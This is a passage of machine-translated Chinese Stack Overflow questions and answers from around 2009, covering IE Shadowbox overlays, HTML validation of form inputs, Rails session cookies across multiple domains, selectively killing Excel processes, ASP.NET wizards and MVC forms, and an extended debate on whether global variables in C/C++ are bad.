这样就`AnimationList`可以保存对父级的引用并使用父级功能。而`Seal`持有对孩子的引用并使用独特的孩子功能并忽略父母的。在此示例中，不`Seal`应该调用`Animate`. 现在，如上所述，`Animate`可以通过转换为基础对象来调用，但这更困难，通常不应该这样做。

# internet-explorer - IE中的影子盒

> ID：484594
> 
> 赞同：0
> 
> 时间：2009-01-27T18:24:40.373
> 
> 标签：internet-explorer, flv, shadowbox

我在 shadowbox 中打开一个 .flv，在 Firefox 中运行良好，但在 IE 的覆盖下方打开。我查看了他们的网站，并仔细检查了`<doctype>`. 这很好，但仍然有问题。

还有其他想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T19:27:13.510

最终成为保险丝盒/冷融合问题。我使用的一些自定义标签在每个页面的顶部，在文档类型声明之前放置了 HTML 注释。我从输出中抑制了那些（使用`<cfsilent>`），一切都很好。 **doctype 需要严格，并且必须是页面的第一项。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T18:28:33.627

在 shadowbox_overlay 上设置位置：绝对

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-11-19T04:36:53.277

```
`<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN">` OK

`<!--DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">-->` CLOSE or DELETE

`<html xmlns="http://www.w3.org/1999/xhtml">` CHANGE 
```

# html - HTML Validator 给我表单输入类型错误，上下文中不允许的元素

> ID：484614
> 
> 赞同：1
> 
> 时间：2009-01-27T18:29:08.227
> 
> 标签：html, w3c-validation

这是我拥有的 HTML 验证器给我一个错误的代码：

```
<input type="text" id="search" name="keywords" />
<input type="submit" value="Search" name="Submit" /> 
```

**这是 HTML Validator 中的错误屏幕截图**（[全尺寸](https://i.stack.imgur.com/1B67V.png)）：

![HTML Validator 中的错误屏幕截图。](https://i.stack.imgur.com/1B67V.png)

这是我收到的错误消息：

> 所提到的元素不允许出现在您放置它的上下文中；其他提到的元素是唯一允许在那里并且可以包含提到的元素的元素。这可能意味着您需要一个包含元素，或者您可能忘记关闭前一个元素。
> 
> HTML 文件的正文中有两种类型的元素，内联元素和块元素。此消息的一个可能原因是您试图将块级元素（例如“<p>”或“<table>”）放入内联元素（例如“<a>”、“<span> "，或 "<font>")。
> 
> 在下面的示例中，<font> 标签是一个内联标签，它只能包含其他内联标签。但是 <p> 标签是块标签。所以 <p> 标签不能包含在 <font> 标签中。

这是它来自的html块：

```
<li>
    <form method="post" action="http://site.com/"  >
    <div class='hiddenFields'>
        <input type="hidden" name="ACT" value="19" />
        <input type="hidden" name="XID" value="90ee0994104d8ba87b6ef9b43e998fc8c89e0d9f" />
        <input type="hidden" name="RP" value="search/results" />
        <input type="hidden" name="NRP" value="" />
        <input type="hidden" name="RES" value="" />
        <input type="hidden" name="status" value="" />
        <input type="hidden" name="weblog" value="forms|alumni_distinguished|housing_faq|international_faq" />
        <input type="hidden" name="search_in" value="everywhere" />
        <input type="hidden" name="where" value="all" />
        <input type="hidden" name="site_id" value="1" />
    </div>

    <input type="text" id="search" name="keywords" /> <input type="submit" value="Search" name="Submit" />
    </form>
</li> 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-27T19:15:49.087

在 HTML4 / XHTML1 中，您不能将内联内容直接放入`form`元素中。另一方面，HTML5 提升了这一要求。

因此，如果验证错误困扰您（还有更糟糕的事情......），请在最后两个s周围添加一个`p`or元素。`div``input`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T18:41:17.033

您还没有提到该验证器针对哪个 HTML 版本进行验证。假设它不是 XTHML，输入标签不被关闭。“/>”的使用意味着您提供了一个结束标签。

欲了解更多信息：[参考](http://htmlhelp.org/reference/html40/forms/input.html)

但是，此限制不适用于要求关闭所有标记的 XHTML。（或者我应该说所有标签都应该关闭的限制只适用于 XHTML）;-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T18:37:06.120

我认为问题在于输入在一个`<li>`元素中，默认情况下它不是[块级元素](http://www.w3.org/TR/REC-html40/struct/global.html#h-7.5.3)。这通常是这种“脱离上下文”错误的原因。它根本不会伤害您的页面，而只是阻止它进行验证。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T18:43:42.160

您使用的是 HTML 还是 XHTML

> 在 HTML 中，`<input>`标签没有结束标签。
> 
> 在 XHTML 中，`<input>`标签必须正确关闭。

[http://www.w3schools.com/tags/tag_input.asp](http://www.w3schools.com/tags/tag_input.asp)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-27T18:44:33.750

在您提供的代码之前是否有未闭合的内联元素？内联元素列表：[http](http://htmlhelp.com/reference/html40/inline.html) ://htmlhelp.com/reference/html40/inline.html（用于 html4）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-16T05:08:09.997

例如。[代码]

[/代码]

将输入标签包装在一个

标签

并确保像上面一样自行关闭输入标签。

这应该验证。

标记

# ruby-on-rails - 为一个 Rails 应用程序使用多个域名时保留会话

> ID：484615
> 
> 赞同：1
> 
> 时间：2009-01-27T18:29:28.897
> 
> 标签：ruby-on-rails, ruby, session

我有一个 Rails 2.2.2 应用程序，我想与多个客户“共享”。每个客户都有自己的域名和数据库。目的是允许一个 Rails 应用程序“托管”许多网站。

我使用 Apache 作为混合集群的前端，作为 Web 服务器。为了让 Rails 知道哪个请求是针对哪个客户端的，Apache 为每个请求添加了一个“client_id”标头。Rails 使用这个 'client_id' 来选择正确的数据库。

只要我一次只从一个域名访问它，它就可以很好地工作。说“example1.com”。

当许多用户同时从多个域名访问应用程序时，它甚至可以正常工作 - 大多数情况下。

我遇到的一个问题是，当两个用户同时从两个域名访问应用程序时，**cookie 会以一种意想不到的方式被重置**。

下面的日志片段说明了该问题：

第一个请求来自登录到 example1.com 的用户 1。

第二个请求来自用户 2，用于 example2.com 主页。

第三个请求来自用户 1，请求应用程序中的另一个页面。据推测，该请求包括原始 cookie。**问题是，为什么 Rails 会发回不同的 cookie ？？？**

请注意，与其他几个问题不同，**我并不想在多个域之间共享同一个 cookie。**上例中的用户 1 和用户 2 正在访问不同的域。

- 约翰

```
**1st Request from USER 1 for example1.com**
    Processing Admin::CmsController#index (for 75.127.142.66 at 2009-01-27 13:15:27) [GET]
      Session ID: 00b9cfb6fd397e5c9934ea58eaef648d
    >>> Request for client 90873721, EXAMPLE1.COM
    Rendering template within layouts/admin/standard
    Rendering admin/cms/list
    Completed in 114ms (View: 14, DB: 81) | 200 OK [https://example1.com/admin/cms]

**2nd Request from User 2 for example2.com**    
    Processing CmsController#cms_show (for 64.1.215.163 at 2009-01-27 13:16:15) [GET]
      Session ID: 4fed1c59001f7484a63fb6280376825a
      Parameters: {"alias"=>"home.html"}
    >>> Request for client 48218343, EXAMPLE2.COM
    ### alias: home.html
    Rendering template within layouts/two-column
    Rendering cms/cms_show
    Completed in 23ms (View: 13, DB: 3) | 200 OK [http://example2.com/]

**3rd Request from User 1 for example1.com -- note session ID changes!!!**    
    Processing Admin::CmsController#index (for 75.127.142.66 at 2009-01-27 13:16:18) [GET]
      Session ID: 85c178aa70ed2bef6a767e844bf6c6d6
    >>> Request for client 90873721, EXAMPLE1.COM
    ####### 'admin/cms', 'index'
    Redirected to actionsignincontroller/admin/user
    Filter chain halted as [:check_authentication] rendered_or_redirected.
    Completed in 4ms | 302 Found [https://example1.com/admin/cms]

**4th request -- redirected from 3rd request**    
    Processing Admin::UserController#signin (for 75.127.142.66 at 2009-01-27 13:16:18) [GET]
      Session ID: 85c178aa70ed2bef6a767e844bf6c6d6
    >>> Request for client 90873721, EXAMPLE1.COM
    Rendering template within layouts/admin/standard
    Rendering admin/user/signin
    Completed in 10ms (View: 6, DB: 0) | 200 OK [https://example1.com/admin/user/signin] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-28T02:50:35.347

好吧，我通过消除共享的 mongrel_cluster 并为每个域提供它自己的 mongrel 实例来“解决”了这个问题。

我希望我可以通过共享一个杂种集群来节省一些服务器资源，但要做到这一点，我需要弄清楚如何解决这个 cookie 问题。

顺便说一句，我在“高级 Rails 食谱”食谱 83，“给用户自己的子域”中找到了部分解决方案。该配方还解释了如何为用户提供自己的域名，但它使用的方法与我尝试的方法不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T18:34:58.060

Cookie 与域相关，因此您应该使用不同的技术 - 单个服务器发出 cookie/创建会话。查看 [跨域用户跟踪](https://stackoverflow.com/questions/216430/cross-domain-user-tracking)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T20:18:24.590

我不是要跨不同域跟踪用户。事实上，如果一个用户打开了两个浏览器，并且同时使用两个域，那么他就有两个不同的会话 cookie，每个域一个。

# c# - excel.exe 的判别式 taskkill.exe

> ID：484620
> 
> 赞同：1
> 
> 时间：2009-01-27T18:31:10.550
> 
> 标签：c#, asp.net, excel, interop

我必须在服务器上运行 Excel 并终止我正在使用 taskkill.exe 的 excel.exe 进程：

System.Diagnostics.Process.Start("taskkill.exe", "-im excel.exe /f");

我唯一的问题是，如果有人也在使用正在处理 excel 的服务器（这可能发生），那么他们的进程也会被杀死。有没有办法只杀死我的代码创建的excel文件？任何帮助都会很棒。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-27T18:33:37.110

跟踪您启动的进程的 PID，并使用 taskkill.exe /pid NUMBER 杀死它们

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T18:34:31.900

如果您能够使用代码（我认为您可以）获取 PID，则可以使用 pid 开关而不是 /im 开关。

# c# - CreateUserWizard-如何在向导期间针对 db 验证数据？

> ID：484624
> 
> 赞同：0
> 
> 时间：2009-01-27T18:32:53.290
> 
> 标签：c#, .net, asp.net, forms-authentication

我正在使用 asp.net CreateUserWizard 控件。我添加了一个 WizardStep，需要它在允许用户创建帐户之前针对我们的内部数据库验证 3 个数据点。但是，当我尝试将下一个按钮单击连接到代码隐藏方法以检查数据时，该事件永远不会在代码隐藏中触发。

下面是下一步按钮上的代码-

```
<asp:Button ID="StepNextButton" runat="server" BackColor="#FFFBFF" 
            BorderColor="#CCCCCC" BorderStyle="Solid" BorderWidth="1px" 
            CommandName="MoveNext" Font-Names="Verdana" ForeColor="#284775" 
            Text="Next" onclick="StepNextButton_Click1" /> 
```

应该这样接线吗？向导是否为您提供了一种方法来确定您正在执行的步骤，因此您无需检查每个步骤？

还有一个问题。为了有效利用基于表单的身份验证并跟踪用户是否当前登录，在我看来，所有页面都需要包装在 LoginView 控件中，因此如果他们的会话过期，他们会查看“未登录'模板视图？正确的？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2009-01-27T20:26:11.563

简单的部分答案：劫持 onclick 事件以调用您自己的函数。如果一切正常，请检查您的数据库并调用 StepNextButton_Click1（确保为此传递适当的调用者和参数）。否则，您可以使页面无效和/或重定向用户。

# .net - MVC：一个表单标签中的多个提交表单

> ID：484631
> 
> 赞同：1
> 
> 时间：2009-01-27T18:33:58.640
> 
> 标签：.net, asp.net-mvc, model-view-controller

我刚开始玩 MVC，但我并没有什么反应。我了解如何制作一个简单的输入表单，并使用提交按钮发布表单设置如下：

```
<form runat="server" method="post" action="/Home/CreateNew" > 
```

但是，如果您的整个应用程序都在一个表单标签内，并且您想要多个输入表单，会发生什么？例如，我在我的母版页上使用了一些 AjaxControlToolkit 控件，这要求整个页面都在一个表单标记内。如果我有两个完全不同的输入表单，我是否必须通过 CreateNew 控制器将它们都集中起来？我如何告诉表单对每个输入表单使用不同的操作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-27T19:08:45.417

您不应该在整个页面上放置一个表单。将您的多个输入表单放在您需要的地方。您也可以摆脱 runat = "server" 。在 MVC 中你不需要它。

由于 MVC 没有 ViewState，很多 Ajax Control Toolkit 只是无法在 MVC 中工作。[有一个仅限客户端的版本，它在某种程度上确实有效](http://stephenwalther.com/blog/archive/2008/08/22/asp-net-mvc-tip-36-create-a-popup-calendar-helper.aspx)。

我的建议是改用[jQuery](http://jquery.com/)。[这现在由 Microsoft 支持](http://www.microsoft.com/web/content.aspx?id=microsoft-adopts-open-source-jQuery-JavaScript-library)，并且更适合 MVC 模型。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-28T00:51:39.453

克雷格是对的，您可能不应该尝试让它与一种表格一起使用。这是非常反 mvc 和反 html，但是，要回答您的问题，您可以使用 javascript 动态更改表单的操作。

# c++ - 全局变量不好吗？

> ID：484635
> 
> 赞同：286
> 
> 时间：2009-01-27T18:35:09.993
> 
> 标签：c++, c, global-variables

在 C/C++ 中，全局变量是否像我的教授认为的那样糟糕？

* * *

## 回答 #1

> 赞同：306
> 
> 时间：2009-01-27T20:11:27.710

全局变量的问题在于，由于每个函数都可以访问这些变量，因此越来越难以确定哪些函数实际读取和写入这些变量。

要了解应用程序的工作原理，您几乎必须考虑修改全局状态的每个函数。这是可以做到的，但随着应用程序的增长，它会变得越来越难，几乎不可能（或至少完全浪费时间）。

如果您不依赖全局变量，您可以根据需要在不同函数之间传递状态。这样你就有更好的机会理解每个函数的作用，因为你不需要考虑全局状态。

* * *

## 回答 #2

> 赞同：113
> 
> 时间：2010-02-24T12:19:03.677

重要的是要记住总体目标：清晰

“无全局变量”规则之所以存在，是因为在大多数情况下，全局变量会使代码的含义变得不那么清晰。

然而，就像许多规则一样，人们记住的是规则，而不是规则的意图。

我见过一些程序，它们似乎通过传递大量参数来使代码大小增加一倍，只是为了避免全局变量的弊端。最后，使用全局变量会让阅读程序的人*更清楚*。由于盲目地遵守规则，最初的程序员违背了规则的意图。

所以，是的，全局变量通常很糟糕。但如果你觉得最终程序员的意图通过使用全局变量变得更加清晰，那就继续吧。但是，请记住，当您强迫某人访问第二段代码（全局代码）以了解第一段代码的工作原理时，会自动导致清晰度下降。

* * *

## 回答 #3

> 赞同：69
> 
> 时间：2009-01-27T18:42:22.507

我的教授曾经说过这样的话：如果你正确使用它们，使用全局变量是可以的。我不认为我曾经擅长正确使用它们，所以我很少使用它们。

* * *

## 回答 #4

> 赞同：47
> 
> 时间：2014-07-01T02:10:43.013

全局变量给程序员带来的问题是它扩展了使用全局变量的各个组件之间的[组件间耦合面。](http://en.wikipedia.org/wiki/Coupling_(computer_programming))这意味着随着使用全局变量的组件数量增加，交互的复杂性也会增加。这种增加的耦合通常使缺陷更容易在进行更改时注入系统，也使缺陷更难诊断和纠正。这种增加的耦合还可以在进行更改时减少可用选项的数量，并且可以增加更改所需的工作量，因为通常必须跟踪也使用全局变量的各种模块以确定更改的后果。

[封装](http://en.wikipedia.org/wiki/Encapsulation_(object-oriented_programming))的目的，基本上与使用全局变量相反，是为了减少耦合，以使理解和更改源更容易、更安全、更容易测试。当不使用全局变量时，使用[单元测试](http://en.wikipedia.org/wiki/Unit_testing)要容易得多。

例如，如果您有一个简单的全局整数变量，它被用作各种组件用作状态机的枚举指标，然后您通过为新组件添加新状态来进行更改，那么您必须跟踪所有其他组件以确保更改不会影响它们。一个可能的问题的例子是，如果在不同的地方使用了一个`switch`语句来测试枚举全局变量的值以及`case`每个当前值的语句，并且碰巧有些`switch`语句没有`default`要处理的案例突然之间，就应用程序而言，您有未定义的行为。

另一方面，共享数据区域的使用可用于包含一组在整个应用程序中引用的全局参数。这种方法通常用于内存占用较小的嵌入式应用程序。

在此类应用程序中使用全局变量时，通常将写入数据区域的责任分配给单个组件，所有其他组件将区域视为`const`并从中读取，从不写入。采用这种方法可以限制可能出现的问题。

**需要解决的全局变量的一些问题**

当全局变量（例如结构）的源被修改时，所有使用它的东西都必须重新编译，以便使用该变量的所有东西都知道它的真实大小和内存模板。

如果多个组件可以修改全局变量，您可能会遇到全局变量中存在不一致数据的问题。对于多线程应用程序，您可能需要添加某种锁定或临界区以提供一种方法，以便一次只有一个线程可以修改全局变量，并且当一个线程正在修改变量时，所有更改都已完成并在其他线程可以查询或修改变量之前提交。

调试使用全局变量的多线程应用程序可能会更加困难。您可能会遇到[竞争条件](https://stackoverflow.com/questions/34510/what-is-a-race-condition)，这些条件会产生难以复制的缺陷。由于多个组件通过全局变量进行通信，特别是在多线程应用程序中，因此很难了解哪个组件在何时以及如何更改变量来更改变量。

名称冲突可能是使用全局变量的问题。与全局变量同名的局部变量可以隐藏全局变量。在使用 C 编程语言时，您还会遇到命名约定问题。一种解决方法是将系统划分为子系统，其中特定子系统的全局变量都以相同的前三个字母开头（参见[解决目标 C 中的名称空间冲突](https://stackoverflow.com/questions/178434/what-is-the-best-way-to-solve-an-objective-c-namespace-collision)）。C++ 提供命名空间，使用 C，您可以通过创建一个全局可见结构来解决此问题，其成员是各种数据项和指向数据和函数的指针，这些数据和函数在文件中作为静态提供，因此仅具有文件可见性，因此它们只能通过引用全局可见的结构。

在某些情况下，原始应用程序意图被更改，以便为单个线程提供状态的全局变量被修改以允许多个重复线程运行。一个示例是为单个用户设计的简单应用程序，该应用程序使用全局变量作为状态，然后从管理层发出请求以添加[REST 接口](http://en.wikipedia.org/wiki/Representational_state_transfer)以允许远程应用程序充当虚拟用户。因此，现在您不得不复制全局变量及其状态信息，以便单个用户以及来自远程应用程序的每个虚拟用户都拥有自己独特的全局变量集。

**使用 C++`namespace`和`struct`C 技术**

对于 C++ 编程语言，该`namespace`指令有助于减少名称冲突的可能性。`namespace`以及`class`各种访问关键字（`private`、、`protected`和`public`）提供了封装变量所需的大部分工具。但是，C 编程语言不提供此指令。这篇 stackoverflow 贴文，[Namespaces in C](https://stackoverflow.com/questions/389827/namespaces-in-c)，为 C 提供了一些技术。

一种有用的技术是拥有一个单一的内存驻留数据区域，该区域被定义为`struct`具有全局可见性的区域，其中包含`struct`指向正在公开的各种全局变量和函数的指针。全局变量的实际定义使用`static`关键字给出文件范围。如果您随后使用`const`关键字来指示哪些是只读的，编译器可以帮助您强制执行只读访问。

使用该`struct`技术还可以封装全局，使其成为一种恰好是全局的包或组件。通过拥有这种组件，可以更轻松地管理影响全局的更改和使用全局的功能。

然而，尽管`namespace`该`struct`技术可以帮助管理名称冲突，但使用全局变量（尤其是在现代多线程应用程序中）引入的组件间耦合的潜在问题仍然存在。

* * *

## 回答 #5

> 赞同：39
> 
> 时间：2009-01-27T20:22:33.333

只有在别无选择时才应使用全局变量。是的，这包括单身人士。90% 的情况下，引入全局变量是为了节省传递参数的成本。然后发生多线程/单元测试/维护编码，你就有问题了。

所以是的，在 90% 的情况下，全局变量都是不好的。您在大学期间不太可能看到这些例外情况。我能想到的一个例外是处理固有的全局对象，例如中断表。数据库连接之类的东西*似乎*是全球性的，但不是。

* * *

## 回答 #6

> 赞同：22
> 
> 时间：2009-01-27T18:37:41.067

是的，但是在您停止使用使用全局变量的代码并开始编写使用使用全局变量的代码的其他东西之前，您不会产生全局变量的成本。但成本仍然存在。

换句话说，这是一个长期的间接成本，因此大多数人认为这还不错。

* * *

## 回答 #7

> 赞同：22
> 
> 时间：2009-01-27T18:44:00.913

全局变量和你做的一样糟糕，不少。

如果您正在创建一个完全封装的程序，您可以使用全局变量。使用全局变量是一种“罪恶”，但编程的罪恶通常是哲学上的。

如果您查看[L.in.oleum](http://en.wikipedia.org/wiki/Linoleum_(programming_language))，您将看到一种其变量完全是全局的语言。它是不可扩展的，因为库都别无选择，只能使用全局变量。

也就是说，如果您有选择，并且可以忽略程序员的哲学，那么全局变量并不是那么糟糕。

如果您正确使用它们，Goto 也不是。

最大的“坏”问题是，如果你用错了，人们会尖叫，火星着陆器坠毁，世界会爆炸……或类似的事情。

* * *

## 回答 #8

> 赞同：20
> 
> 时间：2009-05-16T23:01:56.360

如果您的代码最终可能会在**最高法院审判**期间接受*密集审查*，那么您需要确保避免使用全局变量。

 **请参阅这篇文章： [Buggy 酒精测试仪代码反映了源代码审查的重要性](http://arstechnica.com/tech-policy/news/2009/05/buggy-breathalyzer-code-reflects-importance-of-source-review.ars)

> 两项研究都发现代码风格存在一些问题。与审稿人有关的风格问题之一是广泛使用*未受保护的全局变量*。这被认为是糟糕的形式，因为它增加了程序状态变得不一致或值将被无意修改或覆盖的风险。研究人员还对整个代码中无法始终保持小数精度这一事实表示担忧。

伙计，我敢打赌那些开发人员希望他们没有使用全局变量！

* * *

## 回答 #9

> 赞同：17
> 
> 时间：2009-01-27T18:46:46.540

我会用另一个问题来回答这个问题：你使用[单数](http://en.wikipedia.org/wiki/Singleton_pattern)/单数不好吗？

因为（几乎所有）singelton 用法是一个美化的全局变量。

* * *

## 回答 #10

> 赞同：17
> 
> 时间：2016-02-05T04:20:00.807

问题不在于它们*不好*，而在于它们很*危险*。它们各有优缺点，在某些情况下，它们要么是完成特定任务的最有效方式，要么是唯一的方式。但是，即使您采取措施始终正确使用它们，它们也*很容易被滥用。*

几个优点：

*   可以从任何功能访问。
*   可以从多个线程访问。
*   在程序结束之前永远不会超出范围。

几个缺点：

*   可以从任何函数访问，而无需作为参数显式拖入和/或记录。
*   不是线程安全的。
*   污染全局命名空间并可能导致名称冲突，除非采取措施防止这种情况发生。

请注意，如果您愿意，我列出的前两个优点和前两个缺点是完全相同的，只是措辞不同。这是因为全局变量的特性确实很有用，但使它们有用的特性才是它们所有问题的根源。

一些问题的一些潜在解决方案：

*   考虑它们是否实际上是解决问题的最佳或最有效的解决方案。*如果*有更好的解决方案，请改用它。
*   将它们放在具有唯一名称的命名空间 [C++] 或单例结构 [C, C++] 中（一个很好的例子是`Globals`or `GlobalVars`），或者对全局变量使用标准化的命名约定（例如`global_[name]`or `g_module_varNameStyle`（如注释中的 underscore_d 所述） ））。这将记录它们的使用（您可以通过搜索命名空间/结构名称找到使用全局变量的代码），并将对全局命名空间的影响降至最低。
*   对于访问全局变量的任何函数，明确记录它读取和写入的变量。这将使故障排除更容易。
*   将它们放在自己的源文件中并`extern`在关联的头文件中声明它们，因此它们的使用可以限制在需要访问它们的编译单元中。如果你的代码依赖很多全局变量，但每个编译单元只需要访问其中的一小部分，你可以考虑将它们分类到多个源文件中，这样更容易限制每个文件对全局变量的访问。
*   设置一种机制来锁定和解锁它们，和/或设计您的代码，以便尽可能少的函数需要实际*修改*全局变量。阅读它们比编写它们安全得多，尽管线程竞争仍然可能在多线程程序中引起问题。
*   基本上，尽量减少对它们的访问，并最大限度地提高名称的唯一性。您希望避免名称冲突并尽可能少地使用可能修改任何给定变量的函数。

它们的好坏取决于您如何使用它们。大多数人倾向于糟糕地使用它们，因此对它们普遍持谨慎态度。如果使用得当，它们可以成为一大福音；但是，如果使用不当，它们可以并且*会*在您最不期望的时间和方式回来咬您。

看待它的一个好方法是它们本身并不坏，但它们会促成糟糕的设计，并且可以成倍地增加糟糕设计的效果。

* * *

即使你不打算使用它们，也最好知道如何安全使用它们并选择不使用它们，而不是因为你不知道如何安全使用它们而不使用它们。如果您发现自己需要维护依赖于全局变量的预先存在的代码，如果您不知道如何正确使用它们，您可能会遇到困难。

* * *

## 回答 #11

> 赞同：11
> 
> 时间：2009-01-27T20:22:36.127

正如有人在另一个线程中所说（我在解释）“在您完全理解这样做的后果之前，不应违反这样的规则。”

有时全局变量是必要的，或者至少非常有用（例如，使用系统定义的回调）。另一方面，由于您被告知的所有原因，它们也非常危险。

编程的许多方面可能应该留给专家。有时你需要一把非常锋利的刀。但是在你准备好之前，你不能使用一个......

* * *

## 回答 #12

> 赞同：10
> 
> 时间：2009-01-27T20:44:37.720

使用全局变量有点像在地毯下扫地。这是一个快速修复，在短期内比使用簸箕或真空吸尘器清理它要容易得多。然而，如果你后来最终移动了地毯，你会在下面有一个大的惊喜。

* * *

## 回答 #13

> 赞同：9
> 
> 时间：2009-01-27T20:10:46.120

全局变量通常很糟糕，特别是如果其他人正在处理相同的代码并且不想花 20 分钟搜索引用该变量的所有位置。添加修改变量的线程会带来全新的头痛。

在单个翻译单元中使用的匿名命名空间中的全局常量在专业应用程序和库中很好且无处不在。但是如果数据是可变的，和/或它必须在多个 TU 之间共享，您可能想要封装它——如果不是为了设计，那么为了任何人调试或使用您的代码。

* * *

## 回答 #14

> 赞同：8
> 
> 时间：2009-01-27T18:39:13.700

全局变量是不好的，如果它们允许您操作应该只在本地修改的程序的各个方面。在 OOP 中，全局变量经常与封装理念相冲突。

* * *

## 回答 #15

> 赞同：7
> 
> 时间：2009-01-27T20:02:14.500

我认为你的教授试图在一个坏习惯开始之前就阻止它。

全局变量有自己的位置，就像许多人说的那样，知道何时何地使用它们可能很复杂。因此，我认为与其深入了解您的教授决定禁止的全局变量的原因、方式、时间和位置的本质。谁知道，他将来可能会取消他们的禁令。

* * *

## 回答 #16

> 赞同：7
> 
> 时间：2009-03-06T13:19:25.837

绝对不。虽然滥用它们......那很糟糕。

为了……而盲目地删除它们就是……盲目的。除非您知道优点和缺点，否则最好避开并按照您所学的那样做，但全局变量并没有隐含的错误。当您了解利弊时，您可以更好地做出自己的决定。

* * *

## 回答 #17

> 赞同：6
> 
> 时间：2016-03-10T06:55:59.763

我想反对在整个线程中提出的观点，即它使多线程本身更难或不可能。全局变量是共享状态，但全局变量的替代方案（例如传递指针）也可能共享状态。多线程的问题在于如何正确使用共享状态，而不是该状态是否恰好通过全局变量或其他方式共享。

大多数时候，当你做多线程时，你需要分享一些东西。例如，在生产者-消费者模式中，您可能会共享一些包含工作单元的线程安全队列。并且您可以共享它，因为该数据结构是线程安全的。就线程安全而言，该队列是否是全局的完全无关紧要。

在整个线程中表达的暗示希望在不使用全局变量的情况下将程序从单线程转换为多线程会更容易，这是天真的。是的，全局变量让你更容易射中自己的脚，但是有很多方法可以射中自己。

我不提倡全局变量，因为其他观点仍然存在，我的观点仅仅是程序中的线程数与变量范围无关。

* * *

## 回答 #18

> 赞同：5
> 
> 时间：2009-01-28T16:39:38.307

不，他们一点也不坏。您需要查看编译器生成的（机器）代码才能做出决定，有时使用本地比使用全局要糟糕得多。另请注意，将“静态”放在局部变量上基本上是使其成为全局变量（并产生其他真正的全局变量可以解决的丑陋问题）。“本地全局变量”特别糟糕。

全局变量还可以让您完全控制内存使用，这对于本地变量来说要困难得多。如今，这仅在内存非常有限的嵌入式环境中才重要。在您假设嵌入式与其他环境相同并假设编程规则全面相同之前，您需要了解一些事情。

你质疑所教授的规则是件好事，其中大多数不是因为你被告知的原因。最重要的教训虽然不是这条规则要永远随身携带，但这是一条必须遵守的规则，才能通过这门课并继续前进。在生活中，您会发现对于 XYZ 公司，您将有其他编程规则，最终您必须遵守这些规则才能继续获得薪水。在这两种情况下，你都可以争论规则，但我认为你在工作中的运气会比在学校好得多。你只是众多学生中的另一个，你的座位很快就会被替换，教授们不会，在一份工作中，你是一个小团队中的一员，必须看到这个产品到最后，在那种环境下，制定的规则是为团队成员以及产品和公司的利益，因此，如果每个人都志同道合，或者对于特定产品，如果有充分的工程理由违反您在大学中学到的东西或一些关于通用编程的书，那么将您的想法出售给团队并将其写下来作为有效的方法（如果不是首选方法） . 现实世界中的一切都是公平的游戏。

如果您遵循在学校或书籍中教给您的所有编程规则，您的编程生涯将受到极大限制。您可能会生存下来并拥有丰硕的事业，但是您可以使用的环境的广度和宽度将非常有限。如果您知道规则如何存在以及为什么存在并且可以捍卫它，那很好，如果您的唯一理由是“因为我的老师这么说”，那就不太好了。

请注意，像这样的话题经常在工作场所争论并将继续存在，随着编译器和处理器（和语言）的发展，这些规则也在不断发展，并且不会捍卫你的立场，并且可能会被其他观点的人教导你不会前进。

在此期间，那么就按照说话最大声或拿着最大棍子的那个人所说的去做（直到你是那个喊得最大声并拿着最大棍子的人）。

* * *

## 回答 #19

> 赞同：5
> 
> 时间：2012-02-04T08:22:11.790

是的，因为如果你让不称职的程序员使用它们（阅读 90% 尤其是科学家），你最终会得到 600 多个全局变量，分布在 20 多个文件和一个 12,000 行的项目中，其中 80% 的函数取 void、返回 void 并运行完全基于全局状态。

除非您了解整个项目，否则很快就不可能了解任何时候发生的事情。

* * *

## 回答 #20

> 赞同：4
> 
> 时间：2009-01-27T20:16:13.613

全局变量在小程序中很好，但如果在大程序中以同样的方式使用，那就太糟糕了。

这意味着您可以在学习时轻松养成使用它们的习惯。这就是你的教授试图保护你的东西。

当您更有经验时，当他们没事时学习会更容易。

* * *

## 回答 #21

> 赞同：3
> 
> 时间：2017-02-19T08:33:17.610

****在配置方面，****全局**是好的。当我们希望我们的***配置/更改***对*整个项目*产生*全局影响*时。**

 ***因此，我们可以更改*一种配置*，并将**更改**定向到*整个项目*。但我必须警告你必须非常聪明才能使用 globals 。

* * *

## 回答 #22

> 赞同：2
> 
> 时间：2014-06-07T15:59:25.240

**全局变量**的使用实际上取决于需求。它的优点是，它减少了重复传递值的开销。

但是您的教授是对的，因为它会引发**安全问题**，因此应尽可能避免使用全局变量。全局变量也会产生有时 **难以调试**的问题。

例如：-

在**运行时****修改**变量值的情况。在那一刻，很难确定代码的哪一部分正在修改它以及在什么条件下修改它。

 *** * *

## 回答 #23

> 赞同：2
> 
> 时间：2016-02-05T04:24:44.003

归根结底，您的程序或应用程序仍然可以工作，但需要保持整洁并完全了解正在发生的事情。如果您在所有函数之间共享一个变量值，则可能很难跟踪哪个函数正在更改该值（如果该函数这样做的话）并使调试变得困难一百万倍

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2011-07-12T09:18:02.470

我通常将全局变量用于很少更改的值，例如单例或指向动态加载库中函数的函数指针。在多线程应用程序中使用可变全局变量往往会导致难以跟踪错误，因此我尽量避免这种情况作为一般规则。

使用全局而不是传递参数通常更快，但如果你正在编写一个多线程应用程序，你现在经常这样做，它通常不能很好地工作（你可以使用线程静态，但是性能增益是有问题的） .

* * *

## 回答 #25

> 赞同：1
> 
> 时间：2009-01-27T20:28:08.160

迟早您将需要更改该变量的设置方式或访问它时发生的情况，或者您只需要查找更改的位置。

